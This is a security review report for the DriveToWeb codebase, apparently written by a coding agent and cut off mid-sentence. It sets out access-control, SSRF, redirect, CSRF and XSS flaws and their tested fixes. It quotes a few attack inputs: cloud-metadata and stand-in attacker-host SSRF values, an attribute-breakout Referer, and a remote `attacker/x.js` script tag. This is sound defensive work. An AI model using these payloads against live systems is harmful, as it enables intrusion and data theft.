# DriveToWeb — code review, problems found, and fixes

Review of `jcwtw/drvtw_oss` at commit `0bca345` ("Fix for new vulnerabilities"), plus the
fixes applied in this working tree. Read [HOW-TO-USE.md](HOW-TO-USE.md) for setup and daily
operation; this file is about what was wrong and what changed.

## How this review was done

Everything below was read in the sources and, where it could be executed, executed:

| Check | Command | Result |
|---|---|---|
| PHP parse (6 first-party files, PHPMailer excluded) | `php -l` | clean, PHP 8.4.26 |
| JS parse (17 first-party files, vendored libs excluded) | `node --check` | clean, Node 20 |
| PHP unit + wiring tests | `php tests/run-tests.php` | 187 passed, 0 failed (124 after the first pass) |
| Deployment audit self-test | `php tools/d2w-audit.php --self-test` | ok |
| JS parse (every shipped file) | `node --check` | clean, Node 20 |
| Edge function behaviour (real handlers, CloudFront events) | `node tests/test-lambda.js` | 41 passed, 0 failed |
| PHP ⇄ edge URL contract | `python3 tests/check-edge-contract.py` | 24 checks, holds |
| Admin dashboard matcher | `node tests/test-admin-regex.js` | 8 passed |
| Static site wiring | `node tests/test-static-site.js` | 10 passed |
| nginx configs | `./tests/nginx-lint.sh` (`nginx -t`, 1.26.3) | 3 ok |
| All of the above | `./tests/run-all.sh` | `ALL CHECKS PASSED` |

Not verifiable here (no MongoDB/Redis/no outbound OAuth in the sandbox): full request flows
against a live database. For that reason the security-relevant logic was moved into
`backend/html/drvtw_private/drvtw_util.php` — pure functions that the shipped `index.php`
calls — so the *shipped* code paths are unit-tested, and the `index.php` wiring around them
is verified by the tokenizer-based checks in `tests/run-tests.php` plus review.

One useful control: the same suite can be pointed at any copy of the edge functions with
`D2W_LAMBDA_DIR`. Run against the pre-fix files (`mkdir /tmp/orig-lambda && for f in *_*.js; do
git show HEAD:backend/cf-lambda/$f > /tmp/orig-lambda/$f; done`) plus
`D2W_LAMBDA_DIR=/tmp/orig-lambda node tests/test-lambda.js`, it reports **5 failed checks and a
`TypeError: Cannot read properties of null (reading '1')` thrown from the original
`opf_requestor.js:11`** — i.e. the tests detect the shipped open proxy (any `?ur=` host was
accepted) and the crash on malformed input. The tests are not decoration.

---

## 1. Critical — privileged operations were reachable by anybody

**Where:** `index.php`, `gdNavigate()` (HEAD lines ~2870-3010) and the operator routes
(`api.drv.tw` `@@tok`, `@@log.csv`, `@@backroom`, HEAD lines ~305-315).

**Problem.** The router accepted the reserved `@@` path segment at *any* depth of a user URL:

```php
switch( $path[ $depth + 1 ] ) {
    case '@@cache': case '@@download': case '@@publish': case '@@unlock':
    case '@@lock': case '@@dup': case '@@delete':
```

and executed them **with the site owner's stored refresh/access token**. Nothing in the
request proved that the caller was the owner: no cookie, no token check. `@@dup` and
`@@delete` are mutating Drive-side operations (copy files into / delete files from the
owner's Drive). The same `switch` interpolated `$idFile` straight into a Drive URL
(`'.../files/' . $idFile '/copy'`), so `..`, quotes, or `?alt=media` were attacker-shaped.

The log endpoints were worse: `@@log.csv` was gated only by `time_hash()`, i.e.

```php
sha1( floor( time() / 60 / 60 ) + $offset + 919 )
```

no secret at all — anyone who read the source (it is a public repo) could mint a valid
hourly token and stream the operator log, which contains user e-mails, site names and
full request URIs.

**Fix.**

* `@@` commands are now handled only in the API host's `~user` branch, and only after
  `owner_is_authorized( $userId, $service )` or `ops_is_authorized()` succeeds; unauthenticated
  callers get 401/403, non-`POST` mutators get 405.
* The owner session is a signed cookie, `D2WSESS`, set **only** at the end of the
  server-side `/.a/<svc>/` code exchange: `HMAC( $sessionSecret, userId|service )`,
  `Domain=.$d2wBaseDomain; Secure; HttpOnly; SameSite=Lax`. A bearer token equal to the
  owner's stored access token is accepted as an alternative (for tooling).
* Drive ids are validated with `d2w_valid_file_id()` (33-44 chars, `[A-Za-z0-9_-]`) and
  re-encoded with `rawurlencode()` before use.
* Operator tools now need HTTP basic auth (`$opsUser`/`$opsPass`) *and* a keyed token
  `d2w_ops_token( 'log'|'backroom' )` = `hash_hmac( 'sha256', window|purpose, $opsSecret )`,
  rotating hourly with a 1-window grace. `getLog()` re-checks on every poll, so a leaked
  `@@tok` value cannot be replayed forever.

**Verified by:** `tests/run-tests.php` → "Security gates are wired into index.php" (checks the
real tokenised `index.php`: gate exists, gate precedes `case '@@delete'`, id validation
present, operator routes gated, `sha1( floor( time() …` gone).

## 2. Critical — the edge functions were an open proxy

**Where:** `backend/cf-lambda/opf_requestor.js`, `opf_responder.js`, `guf_requestor.js`.

**Problem.**

* `opf_requestor.js` copied whatever the client put in `?ur=` straight into the CloudFront
  origin: `ur=169.254.169.254/latest/meta-data/…` or `ur=attacker.tld/…` turned the CDN into
  a general-purpose proxy (SSRF against the origin's metadata service, cache poisoning,
  referral laundering). It also assumed the regex matched:
  `''.match(/^([^/]*)(\/.*)$/)` → `null` → `TypeError` → hard 500 for malformed input
  (confirmed: the original file throws at line 11).
* `guf_requestor.js` parsed `/_guf/` with a *single* capture group, so the
  `<siteName>/<fileId>` pair PHP actually emits became one Drive file id — every CDN-served
  Drive file 404'd (`request.uri = '/drive/v3/files/' + 'site/1Bxi…'`).
* Both functions logged entire responses/headers with `console.log`, which put the
  `Authorization: Bearer …` value into CloudFront logs.
* `opf_responder.js`/`guf_responder.js` cached *everything* for 180 days (including 401/403)
  and dereferenced `headers[...]` without checks.
* `minProtocolVersion` allowed `SSLv3`/`TLSv1`.

**Fix (all four files rewritten, `node --check` clean):**

* host allowlist `ALLOWED_SUFFIXES = ['graph.microsoft.com','sharepoint.com','1drv.ms','office.com','office365.com']`
  with an exact host/path shape check, `..` rejection, GET/HEAD only, and clean `deny()`
  responses instead of exceptions; `minProtocolVersion: 'TLSv1.2'`;
* `uri.match( /^\/_guf\/([^/]+)\/(.+)$/ )` — site and id separated; id validated against
  `FILE_ID_RE` and re-encoded with `encodeURIComponent`; referer rebuilt from
  `request.headers.host` instead of the hardcoded `cdn-of.drv.tw`;
* `redacted()` logger so tokens/headers never reach CloudFront logs (asserted in tests);
* responders are null-safe (`getHeader()`), never redirect on a missing
  `WWW-Authenticate` (that crash is a test case now), and honour `no-store`/`private`
  instead of forcing 180-day caching;
* the `GOOGLE_API_KEY` fallback now fails closed (`403`) instead of sending `key=undefined`.

**Verified by:** `node tests/test-lambda.js` (41 checks incl. SSRF refusals, malformed-input
no-throw, token round-trip, log redaction, 401-without-WWW-Authenticate) and
`python3 tests/check-edge-contract.py`, which builds the proxied URLs *with PHP* using the
same `urlencode`/`rawurlencode`/`strrev` composition as `index.php` and feeds them to the
shipped handlers.

## 3. High — open redirect, header injection and broken mail verification

**Where:** `sendAuthCode()` / `checkAuthCode()` (HEAD 505-585), `sendContent()` CORS.

* `header( 'Location: ' . $_GET['state'] )` — `state` was an arbitrary URL: open redirect on
  the host that issues owner sessions. Now `d2w_safe_site_redirect()` allows only
  `/.b/`, `/~`, or a `*.$d2wSiteSuffix` path.
* `state` and e-mail fragments were interpolated into `Location:`/headers without CRLF
  filtering — response splitting. All header values now go through `d2w_equals()` +
  newline stripping.
* `sprintf('%06d', mt_rand(0, 999999))` for a 6-digit auth code, and `mt_rand(0,99)` in the
  log ident → `random_int()`.
* The MX check was `strpos($email,'@') || !dns_get_mx(substr(...))` — wrong precedence *and*
  `dns_get_mx()` called with 1 of its 3 required arguments, i.e. `ArgumentCountError`, so the
  function 500'd on every address containing `@`. Replaced by `d2w_check_recipient_email()`:
  shape check, then `checkdnsrr( domain, 'MX' )` in the domain position (unit-tested, so the
  old bug can't return).
* `foreach( $blacklist_email as … )` iterated a variable that only exists as a comment in
  `drvtw_blacklist.php:774` → warning on every call. Now guarded + `is_array()`.
* The API returned `success` even when `PHPMailer::send()` threw; `$res['success'] = TRUE`
  is now set only after a successful send.
* CORS: the origin was echoed whenever it ended in the base domain, with no `Vary`, so CDN
  responses leaked across origins (and `X-Requested-With` was spelled `X-Requested-Wtih`).
  Now `d2w_cors_origin()` decides, `Access-Control-Allow-*` + `Vary: Origin`
  (+ `X-Requested-With` when that header exists) are emitted together.

## 4. High — content moderation could be bypassed; unauthenticated serving

* `quarantineHtml()` used `if( ! strpos( $html, $needle ) )` — a match at offset 0 was
  treated as "not found", and it used `strpos` on a haystack smaller than the needle etc.
  Now `d2w_match_blacklist()` (exact substring list + regex list, both case-insensitive,
  tested against offset-0 cases). The Markdown branch (`*.md`) was served as `text/html`
  **without** any quarantine; it now runs through the same check.
* `resolve()` had `$bAuthenticated = TRUE ;` hardcoded, i.e. the "site owner approved by
  e-mail" gate was dead. Replaced with the documented switch `$requireApprovedSites`
  (default off for new installs, and it reads `db.sites.bAuthenticated`).

## 5. Medium — correctness

| Problem | Fix |
|---|---|
| `setSiteInfo()` collision loop was `while( … )` around a query whose result was never used, so it never retried; names were `base64( md5( $userId . '.' . $service ) )` → **predictable from the user id**, and site names are unguessable-only secrets here | `d2w_generate_site_name()` (22 chars from a `random_int` alphabet, optional `$siteNameSecret` seed for reproducibility) + a real collision retry loop |
| `addAbuseReport()`: `isset( $params['x'] ) ?? $entry['y'] = $params['x']` — `??` as a statement does nothing; `'decription'` typo; `$params['url']` unguarded | explicit `isset()` assignments, field renamed, `400` on a missing url |
| `$maxAge = 300 + $token['expires']->getTimestamp() …` fatal when `expires` is absent | guarded `isset()` + `max( 60, … )` |
| `$urlProxiedCopy` used before assignment in some branches; `?ur=` double-decoded (`urldecode()` in PHP *and* by CloudFront, mangling Graph URLs containing `%xx`) | single `rawurlencode()`, initialised variable |
| `odNavigate()` read `$http_response_header` unconditionally and `print_r()`'d debug output into the response body | guarded, debug output removed |
| `tempnam( '/tmp', … )` unchecked (`FALSE` later fed to `file_get_contents`), hard-coded `/tmp`, `unlink()` unguarded | `sys_get_temp_dir()`, `FALSE` check, guarded `unlink()` |
| `detect_utf_encoding()` tested UTF-32 BOMs with `substr( $text, 0, 3 )` and called `define()` inside the function (redefine notice per request) | correct offsets; constants moved out; `acceptQuality()` treated integer `q=0` as missing, and `handleAccept()` read `HTTP_ACCEPT` without checking |
| Mongo connection used `verify_peer => FALSE, allow_self_signed => TRUE` for *every* connection (including the one carrying OAuth refresh tokens), forced `'ssl' => TRUE` on the local Unix socket, and its `catch` called `exit()` mid-request, producing a blank page | **Corrected in the second pass** (see §11) — my first pass claimed this was fixed; only the *other* connection site was. Now: verification on unless `$mongoTlsAllowSelfSigned`, `cafile` honoured via `$mongoTlsCAFile`, no TLS on a plain local socket (`$mongoTlsLocal` opts in), and `openDb()` answers 503 + `Retry-After` with the DSN password redacted from the log |
| `/*debug*/ '584574ea7674fca77585b481' == $userId` gated a whole feature to the author's account | `$allowCreatePostDb` config flag |
| `drvtw_log.php` created its folder with `mkdir( …, 0640 )` — a directory without the execute bit, so `fopen()` always failed; the failure then hit `fputcsv( false, … )` (TypeError → fatal, no response); `fputcsv()` also trips the PHP 8.4 `$escape` deprecation | 0770 + `is_resource()` guards + `D2W_LOG_FOLDER` env + `stream_set_locking( LOCK_EX )` + explicit separators/escape; failures degrade to `error_log()` |
| `index.php` used relative `require "drvtw_private/…"` and `file_get_contents( 'inline/…' )`, i.e. silently depended on the CWD being the docroot | `__DIR__`-based requires; `d2w_inline_page()`; a missing `drvtw_creds.php` now returns a clear 500 message instead of a PHP fatal |
| Site name / user name interpolated into `Location` and into `db.sites` lookups without shape checks | `d2w_valid_site_name()`, `d2w_generate_site_name()`, DNS-label validation |

## 6. Medium — deployment configs

`backend/nginx_drvtw`, `backend/nginx_proxy`, `backend/nginx_drvpx`:

* `set_real_ip_from 0.0.0.0/0` with `real_ip_header X-Forwarded-For` — every client could pick
  its own apparent source address, defeating `limit_req`, the abuse reports and the log.
  Now only `127.0.0.1`/`10.0.0.0/8` (with a commented slot for your proxy IPs) plus
  `real_ip_recursive on`.
* `fastcgi_pass unix:/run/php/php7.4-fpm.sock` while the install guide installs PHP 8.x — the
  site cannot start. Now `php8.1-fpm.sock` with a comment to match your pool.
* `location /drvtw_private/ { deny all; }` answered 403 (proving the path exists) and nothing
  protected `.git`/`.env` if the docroot ever gains them → `^~` + `return 404`, plus a dotfile
  deny. `location ~ ^/(index|info).php$` executed an `info.php` if one was ever dropped in the
  docroot → `location = /index.php`.
* `Host` header was used directly as a filesystem path component in
  `try_files /$host$uri …` → `if ($host !~* "^[a-z0-9.-]{1,253}$") { return 400; }`.
* `nginx_proxy` still pointed at the author's upstream hosts (172.17.14.69, 47.254.47.165) and
  `nginx_drvpx` still referenced `drv.tw` certificate paths → placeholders.
* TLS: `TLSv1 TLSv1.1` + `ssl_prefer_server_ciphers on` → `TLSv1.2 TLSv1.3`, prefer off.
* `$uid_got` in `limit_req_zone $request_uri$uid_got$binary_remote_addr` **is** defined
  (built-in `ngx_http_uid` module) — checked with a live `nginx -t`; deliberately *not* changed.

## 7. Medium — the front end could not actually be used

* `backend/html/inline/admin.html` (the page users land on after sign-in) loaded
  `/inc/admin.min.js`, which does not exist in the repository — the dashboard loaded no
  JavaScript at all. Now loads `/inc/config.js` + `/inc/admin.js`.
* `inc/admin.js` hardcoded the **author's** OAuth client ids
  (`377757361231-areciaupege06…apps.googleusercontent.com`, `228a690d-3bab-43cc-9ba2-2b121f20e8d0`),
  `redirect_uri=https://api.drv.tw/.b/…` and `.on.drv.tw` — a self-hosted instance would
  have signed users into the shut-down hosted service. Its URL matcher also required a `?`
  (so a bare `/~user@x.com/gd/` fell through to a redirect to the marketing site).
* All pages carried `mailto:drvtw@outlook.com`, `docs-of.drv.tw` links and
  `<base href="https://www.drv.tw">` (which pins `/inc/*` asset loads to that host), and
  `inc/wd.js` sent page views to the author's Google Analytics property
  (`UA-85417367-1`). `supportus.html` loaded the PayPal SDK with
  `client-id=YOUR_PAYPAL_CLIENT_ID` and then called `paypal.Buttons()` unconditionally →
  `ReferenceError: paypal is not defined`.
* `frontend/README.md` referenced `.github/workflows/deploy-frontend.yml`, which did not exist.
* `backend/html/www.drv.tw/` was a stale duplicate of `frontend/www.drv.tw/` (login box
  commented out, shutdown notice baked in), plus a leftover `inc/admin2.js`.

**Fix.** A real config layer: `frontend/www.drv.tw/inc/config.js` (`window.D2W`) supplies
OAuth client ids, API/web hosts, site suffix, contact address, docs URL, analytics id and
PayPal client id, and `wd.js` resolves the `{{CONTACT}}`/`{{DOCS}}` markers client-side and
only loads analytics/PayPal when configured. `inline/*.html` (served by PHP) use
`{{WEB_URL}}`/`{{API_URL}}`/`{{CONTACT_EMAIL}}`/`{{SITE_SUFFIX}}`/`{{BASE_DOMAIN}}` markers
resolved by `d2w_inline_page()` from the same config values, so the error pages, admin page
and backroom belong to *your* domain. `admin.js`'s matcher is now host-agnostic
(regex-escaped) and query-optional. `backend/html/www.drv.tw/` is synced from
`frontend/` (verified identical apart from `staticwebapp.config.json`, which belongs to the
Azure deploy only), `inc/admin2.js` deleted, and `.github/workflows/deploy-frontend.yml`
added (tests + Azure Static Web Apps deploy).

## 8. Things deliberately *not* changed

* The `$d2wBaseDomain` default stays `'drv.tw'` so the hosted-service behaviour is
  reproducible; every other `drv.tw` string in `index.php` was already replaced by config.
* The phishing blacklist (`drvtw_blacklist.php`, 819 lines) is content, not code; it needs
  operational maintenance, which is why `$blacklist_email` stays a comment and the code now
  tolerates its absence.
* Vendored libraries (`PHPMailer/`, `inc/jquery*`, `bootstrap*`, `punycode*`, themes) were not
  rewritten; only first-party files were edited, and the test suite excludes the vendored
  paths.
* `info.php` support removed from nginx rather than adding a docroot file, since a
  `phpinfo()` page in a public docroot is a disclosure risk.

## 9. Residual risks you should plan for

1. **Google Drive sign-ups are closed** for new OAuth apps (restricted scope policy since
   2025-09). A fresh deployment is effectively OneDrive-only until Google approves the scope.
2. **Abuse is the business model's weak point.** The service exists to host arbitrary HTML
   from cloud drives, which attracts phishing; the content quarantine is a string list, not
   a sandbox. Expect to maintain `drvtw_blacklist.php` and to keep `$requireApprovedSites`
   on for anything public-facing.
3. **`?ra=` token obfuscation is not encryption.** Reversal only keeps tokens out of casual
   log grepping; the edge still receives a bearer secret in a query string. If you deploy
   the CloudFront functions, restrict the distributions to your own hosts and keep
   `X-Forwarded-For` trust narrow. Consider replacing the flow with an origin-request
   lambda that fetches the token from a private store (noted, not implemented).
4. **Session model.** `D2WSESS` proves "this browser completed OAuth for this user"; it is
   not a full session store (no server-side revocation list). Rotate `$sessionSecret` to log
   everyone out.
5. **No CSRF token** on the `@@` mutations; the mitigations are `SameSite=Lax`, POST-only
   mutators, and the bearer-token alternative. A `POST` form from another origin can reach
   them only if you also relax `Content-Type` checks — worth adding if you expose the API to
   browsers directly.
6. `PHPMailer` is vendored at an old version (LGPL-2.1) — update it as a unit.

## 10. New/changed files

```
backend/html/index.php                                   hardened router (see §1-§5)
backend/html/drvtw_private/drvtw_util.php                NEW  shared helpers, unit-tested
backend/html/drvtw_private/drvtw_log.php                 rewritten logger
backend/html/drvtw_private/drvtw_creds.example.php       every config key, documented
backend/html/inline/*.html, inline/d2w_sw.js             placeholders instead of drv.tw
backend/cf-lambda/*.js                                   all four functions rewritten
backend/nginx_drvtw, backend/nginx_proxy, backend/nginx_drvpx   hardened
backend/setup/DrvTWServerInstallation.txt                updated to PHP 8.x + new keys
backend/html/www.drv.tw/**                               synced from frontend/
frontend/www.drv.tw/inc/config.js                        NEW  window.D2W deployment config
frontend/www.drv.tw/inc/admin.js, wd.js, *.html          config-driven, no author leftovers
frontend/www.drv.tw/inc/admin2.js                        removed
.github/workflows/deploy-frontend.yml                    NEW  tests + Azure deploy
tests/run-tests.php, tests/test-lambda.js, tests/test-admin-regex.js,
tests/test-static-site.js, tests/check-edge-contract.py,
tests/nginx-lint.sh, tests/run-all.sh, tests/README.md    NEW  test suite
HOW-TO-USE.md, ANALYSIS-REPORT.md                        NEW  this file + usage guide
```

---

## Second pass (after the first round of fixes)

Five more defects found and fixed, one of them *in my own earlier work* — listed in the order I
got to them.

### 11.1 My first pass was wrong about MongoDB TLS

The table in §5 said Mongo certificate verification had been turned on. It had not: `openDb()`
still passed `verify_peer => FALSE, allow_self_signed => TRUE` to **every** connection and
`'ssl' => TRUE` to the local Unix socket, where TLS is meaningless. Found while adding the
audit tool (the review's own claims need checking too). Fixed in `openDb()` now, and covered by
`php -l` + review; a live Atlas/socket handshake is still unverifiable here (no MongoDB).

### 11.2 Credentials and visitor e-mails were being written to `user.log`

`sendContent()` logged the CDN redirect target verbatim — including `?ra=<reversed bearer
token>`, which is exactly the value the edge functions were hardened not to log. The same file
receives visitor e-mail addresses from the mail path, is group-readable, and is streamed by
`@@backroom`.

* Fixed: `d2w_log_scrub()` applied inside `d2w_putlog()` (one choke point, so nothing can forget
  it) — hides `ra=`/`token=`/`Authorization`/`D2WSESS` values, `Bearer`/`Basic` material,
  `ya29.*`/`E.*`/JWT-shaped strings, and e-mail local parts (domains are kept, they are what
  abuse triage needs).
* Kept deliberately: 24-hex Mongo user ids, site names and file ids, because the log is useless
  without them. Unit-tested both ways (`tests/run-tests.php` → "Log privacy scrubbing"),
  including reading the *actual* file the logger wrote.

### 11.3 `@@` mutators had no CSRF protection

`SameSite=Lax` does not stop a same-site POST, and every hosted site lives on
`*.<your.domain>` — i.e. a hostile hosted page (or any page that can set a `.your.domain`
cookie) could issue `@@delete`/`@@dup` as the signed-in owner.

* Fixed: cookie-authenticated mutations must carry `X-D2W-CSRF` (or `d2w_csrf` in the body). The
  token is `substr( hmac( $sessionSecret, 'csrf|userId|service|expires' ), 0, 40 )` — derived
  from the session, so it needs no storage, expires with the session, and cannot be minted
  without the secret. `d2w_privileged_request_allowed()` gained an out parameter reporting *how*
  the caller authenticated, so bearer callers (who cannot be driven cross-site) stay exempt.
* `inline/admin.html` embeds it as `<meta name="d2w-csrf">`; a new **Site tools** panel in
  `admin.js` uses it, which also closes the "the dashboard cannot do anything" gap from §7.
* Verified: `d2w_csrf_ok()` unit tests (cross-session rejection, forged cookie, no-session ⇒
  empty token ⇒ fail closed) and a tokenised wiring test that `ERR_CSRF_REQUIRED` is checked
  *before* `case '@@delete'`.

### 11.4 Site access codes could be guessed forever

(The window is a knob too: `$authCodeRetryWindowSec`, 900 s by default, and the
`d2w_attempt_policy()` clamp means the guard cannot be disabled by setting 0 — raise the numbers
instead of turning it off.)

`sendAuthCode()` throttled *sending*; `checkAuthCode()` placed no bound on *verification* — a
6-digit code valid for 15 minutes with unlimited tries. Fixed with a per-site counter
(`wwwdrv.authfail`, `_id = site`, TTL index added to `setup/mongod/init.js`) and the pure policy
function `d2w_attempt_policy()`; on trip the visitor is bounced with `?auth=slow` and
`Retry-After` and the code is not tested at all. A DB failure degrades to "no data" rather than
locking a real owner out, which is stated in the code. Counter semantics are unit-tested (cap,
window reset, `Retry-After` capped at one window even with a future timestamp).

### 11.5 No security headers, and a phpinfo-shaped hole

* `sendContent()` did not send `X-Content-Type-Options`; nor did the app's own pages, which were
  indexable and frameable. Now: app pages get `nosniff`, `X-Frame-Options: SAMEORIGIN`,
  `Referrer-Policy: same-origin`, `X-Robots-Tag: noindex, nofollow`, `Permissions-Policy` and a
  default CSP; hosted content gets `nosniff` + `Cross-Origin-Resource-Policy: cross-origin` and
  no CSP unless the operator sets `$d2wContentCSP` (a strict default would break arbitrary
  hosted sites — a deliberate trade-off, documented in both READMEs).
  `inline/admin.html` also carried the author's Analytics id in its translate-widget config; gone.
* The `tools/` audit also flags `location ~ ^/(index|info).php$` regressions if someone re-adds
  them, and the shipped pattern was already narrowed to `location = /index.php`.

### 11.6 A deployment audit tool, and what it found in this repo

`--root` accepts either the deployment folder (`/var/www/drv_tw`) or the docroot
(`/var/www/drv_tw/html`), and when given `--root` it reads the **installed** `nginx_*` configs, so
the `fastcgi_pass` socket check describes the operator's machine rather than the repo copy (a
`(repo copy)` suffix says when it had to fall back).

New `tools/d2w-audit.php` (exit 2 = blocking problems; `--json`, `--root`, `--self-test`, now in
`tests/run-all.sh` and CI): config placeholders, host sanity, secret strength, DSN sanity,
extension list, `drvtw_creds.php` permissions, log-folder readability/searchability, leftover
`drv.tw` URLs in `inline/`, nginx `fastcgi_pass` socket existence, `set_real_ip_from 0.0.0.0/0`,
plus a structural lint of `drvtw_blacklist.php`.

Its findings on this repository, which I did **not** silently "fix" because they are operator
data rather than code:

| Finding | Note |
|---|---|
| entry 89 is `array( 'charCodeAt(i)', array() )` | a group with no patterns can never match: the "231016 WeTransfer phish" rule near line 469 is inert |
| 5 duplicated needles inside groups (entries 24, 36, 37, 66, 100) | dead weight, no behaviour change |
| 7 needles shorter than 6 letters (`'PayPal'`, `'Microsoft'`, `'Sign in'`, `'password'`, `'Webmail'`, `'Mailbox Upgrade Portal'`…) | with their group key they block a lot; expect false positives on legitimate sites |
| 7 group keys shorter than 6 chars | same class of risk |
| `$blacklist_copyright` (21 entries) names `<site>.on.drv.tw` hosts | a self-hosted instance will never match them: replace with your own takedown records |
| `$blacklist_email` still exists only as a comment | tolerated by the code since the first pass; blocked-domain checking is effectively off until it is defined |

### 11.6b Two scope bugs found while writing the deployment runbook

Both were mine, both fail closed, and neither is visible to `php -l` — which is the honest
answer to "how do you know untested PHP works":

* `gdNavigate()` used `$service` for `owner_auth_method()` but never received it, so the
  comparison ran against `''`: **every** cookie-authenticated `@@` command answered
  `403 ERR_AUTH_REQUIRED`, and the Site tools panel would have been dead on arrival. The service
  now arrives as the last argument (from `resolve()`'s `$siteInfo->service`) and is forwarded by
  all three recursive calls; if it is missing the gate refuses rather than guessing.
* `reportAbuse()` read `isset( $authHeader )` on a function-local, so no `Authorization: Bearer
  <$apiTokens[…]›` caller could ever post a report (`401 ERR_AUTH_FAILED`). It now globalises
  `$authHeader`.

Two more guards came out of this, and both paid for themselves immediately:

* `tests/run-tests.php` installs an error handler and **fails if the suite emits any PHP
  diagnostic**. That is what catches "undefined variable" class bugs when there is no way to run
  the real request: it found a fixture variable (`$csrfFixture`) used before it was defined, which
  had been making the admin-page CSRF assertion pass vacuously against an empty string.
* The response-header set is now asserted as *behaviour*, not as source text: the suite starts
  `php -S` with a two-line router that requires `drvtw_util.php` and calls `d2w_page_headers()`,
  then reads the reply. `d2w_page_headers()` skips its `header()` calls when `PHP_SAPI === 'cli'`
  (the built-in server is `cli-server`, so the test still exercises the real path, and `php -l`,
  the audit tool and the unit tests stop emitting "headers already sent" noise).

`tests/run-tests.php` also gained a "Variable scope and doc accuracy" section that (a) asserts
`gdNavigate`'s signature and *each* call site pass `$service`, (b) asserts `reportAbuse`
globalises `$authHeader`, (c) extracts every `$name` used in `SECURITY.md`, `HOW-TO-USE.md` and
`backend/README.md` and fails if it is not a variable in the shipped PHP — the check that caught
three invented config keys in my own SECURITY.md (`$d2wAllowedGdDomains`, `$debugToken`,
`$authCodeRetryWindowSec`), which have been removed or, in the last case, implemented for real.

### 11.7 Updated verification

| Check | Result |
|---|---|
| `php tests/run-tests.php` | **187 passed, 0 failed** (124 → 163 → 177 → 187 across the two passes) |
| `node tests/test-lambda.js` | 41 passed |
| `node tests/test-admin-regex.js` / `test-static-site.js` | 8 / 10 passed |
| `python3 tests/check-edge-contract.py` | 24 checks hold |
| `php tools/d2w-audit.php --self-test` | ok (14 problems found in a placeholder deployment, none in a complete one) |
| `php -l` / `node --check` | clean on all first-party files |
| `./tests/nginx-lint.sh` | 3 configs valid |
| `./tests/run-all.sh` | `ALL CHECKS PASSED` |

## 12. Self-serve naming — and the three defects it exposed

The request was to make the whole path usable without an operator in the loop: connect a drive, get
a URL, optionally bring your own domain. Signing in already did the first two (`gd|odSetupFromAuthCode()`
call `setSiteInfo( NULL, … )` and `set_owner_session()`, then redirect to `?a=admin`), so the work was
the naming UI plus the three commands it needs.

**Backend** (`index.php`, beside `setSiteAuthenticate()`): `site_reserved_names()`, `site_name_status()`,
`site_name_copyright_blocked()`, `send_site_json()`, `site_send_info()`, `site_rename()`,
`move_site_record()`, `site_bind_domain()`, `site_check_available()`. `@@site` (read), `@@rename` and
`@@domain` (mutators) join `$bPrivileged`, so they need the owner session or a bearer token and, for
POST/PUT, `X-D2W-CSRF`; `@@site` is exempt from the mutator rule the same way `@@cache`/`@@download`
are. The availability lookup is `GET /do/siteName?name=`, public, answering only free/taken plus the
normalised candidate. `move_site_record()` upserts the new `wwwdrv.sites` row and deletes the old one
in a single `BulkWrite` **per store** (local + remote) so a rename cannot half-apply; the throttle
counter (`tsNameChange`) and `prevSite` are written with it. Renaming is refused outright for a
blacklisted site, otherwise the block is keyed by host+path of the old name and a rename would be an
escape hatch. Domain binding is DNS-only: the panel shows the exact `TXT` value
(`DRVTW=<site>.on.<base>`) and `@@domain` checks that record or a matching `CNAME` before storing
anything — nothing here can write to someone else's zone.

**Naming rules** (`drvtw_util.php`): `d2w_site_name_reserved()`, `d2w_normalize_site_name()`,
`d2w_site_name_claimable()`, `d2w_site_public_url()`, `d2w_site_domain_hint()`, with `$siteNameChangeGapSec`
(3600) and `$d2wReservedSiteNames` as the two new knobs. Deliberate choices worth keeping: accented
input is **refused, never transliterated** (silently turning `café` into `caf` hands the owner a URL
they did not ask for), `xn--` labels are preserved by the normalizer only so the claim check can
refuse them with a sentence, reserved names are reported as reserved before any length or lookup
work, and all-digit or hyphen-terminated labels are refused because they are either resolver-ambiguous
or look like system addresses.

### 12.1 The default CSP of pass 2 would have broken the site

Writing the GUI meant reading the pages it lives on, and that turned up a defect introduced by the
hardening pass itself: the default `script-src 'self' https:` has no `'unsafe-inline'` and no nonce,
while *every* PHP-rendered page has an inline `<script>` body (`403-authenticate.html` 4 KB of it,
`backroom.html` 21 KB, `admin.html`, `403/404/405/429/403-complaint/403-content`) and two of them also
relied on `onchange=`/`onclick=` attributes. The header was being *sent* correctly — which is all the
187-test suite asserted — so nothing caught that it would disable the visitor's access-code form and
the operator's log viewer on a live deployment.

Fix: `d2w_csp_nonce()` (one per request) feeds both `d2w_app_csp()` and a new `{{CSP_NONCE}}`
substitution in `d2w_inline_page()`, inline `<script>` tags in the templates carry
`nonce="{{CSP_NONCE}}"`, an operator `$d2wAppCSP` may embed `{{NONCE}}` where it wants it, and the
`on*=` handlers became `addEventListener` calls — a nonce authorises a script *element*, never an
attribute handler, so those could not be salvaged any other way. `md_wrap.html` stays policy-exempt for
the reason documented in pass 2 (it renders inside a frame of the user's own content).

### 12.2 The backroom escaped nothing, and `https:` in `script-src` made that exploitable

`backend/html/inline/backroom.html` builds its table by string concatenation and interpolated
`referrer`, `url`, `ua`, `uid`, `ip` and the cache columns raw; only one of the two display values was
escaped. A `Referer` of `" onmouseover="…` closes the attribute, and because the operator page loads
ApexCharts/Font Awesome from CDNs, `script-src` allows `https:` — so an injected
`<script src="https://attacker/x.js">` would have run in the page that reads the deployment's logs,
next to the owner-ish `@@tok` fetch. Every interpolation now goes through `esc()`, link targets through
`safeHref()` (which maps `javascript:`/`data:` to `#`), `rel="noopener noreferrer"` was added, and the
sortable headers / row toggles became `data-sort` / `data-toggle` handled by one delegated listener so
no inline handler is needed.

### 12.3 A leftover of the hosted service

`gaId: 'UA-85417367-1'` (the original author's Analytics property) was still in seven of the inline
error pages; pass 2 only fixed `admin.html`. On a self-hosted install that meant every 403/404/405/429
page a visitor hit reported to the author rather than to the operator. Removed, and a guard test walks
`backend/html` and `frontend/www.drv.tw` so the pattern cannot come back.

### 12.4 Two of my own bugs, recorded because they are the instructive kind

* A scripted `str.replace` inserted `site_rename( $userId, $token, … )` where `$service` belongs. It
  lints, and 253 tests passed, because nothing called the function. Now: the call site is asserted
  against the tokenised source, and the whole admin.js panel is *executed* in a Node harness with a
  stubbed `fetch`/DOM, which is how the CSRF header, the `name=` body, the 409 path and the debounce are
  actually verified rather than eyeballed.
* `tests/run-tests.php` launched its throwaway `php -S` on `18500 + pid % 900` and killed it with
  `pkill`. Two consecutive runs then collided: the second reached the *first* run's half-dead server and
  reported HTTP 500s for code that no longer existed — a flaky suite that had nothing to do with the
